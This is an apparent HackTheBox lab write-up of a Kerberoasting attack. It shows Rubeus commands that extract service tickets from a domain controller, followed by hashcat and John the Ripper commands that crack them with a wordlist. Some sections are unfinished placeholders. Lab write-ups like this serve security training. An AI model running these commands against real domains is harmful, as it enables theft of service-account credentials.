# HackTheBox - Kerberoasting Lab

## Objective

Perform a Kerberoasting attack on ???, find the user account 'svc-iam' then crack password.
Connect to DC1 and investigate Event Manager to find the attack 

## Skills Learned
- Run a Kerberoasting attack
- 

## Tools Used
- Windows Event Log
- John The Ripper
- Hashcat
- Rubeus
- Powershell
- Kali Linux
- 
## Steps

First we need to RDP to the windows machine

```
xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution
```


Next we run Rubeus with the kerberoast action without specifying a user, it will extract tickets for every user that has an SPN registered

```
.\Rubeus.exe kerberoast /outfile:spn.txt
```

![image](https://github.com/Matt4llan/HackTheBox-Kerberoasting/assets/156334555/2fa6d522-6b9e-42c0-bd6d-117eb65ef4c1)


Now time to get cracking!! we need to move this file over to Kali to crack the password. I will use both Hashcat and John the ripper just for funzies.

### Hashcat

```
hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/Matt4llan/HackTheBox-Kerberoasting/assets/156334555/e3079a53-f861-48d5-b76e-e24c2b76edae)
![image](https://github.com/Matt4llan/HackTheBox-Kerberoasting/assets/156334555/b442e61d-45e8-4bbe-a6ce-564923fe32d5)


### John The ripper

```
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --pot=results.pot
```

![image](https://github.com/Matt4llan/HackTheBox-Kerberoasting/assets/156334555/a11d021f-4190-43cd-91aa-b85a2af71b46)
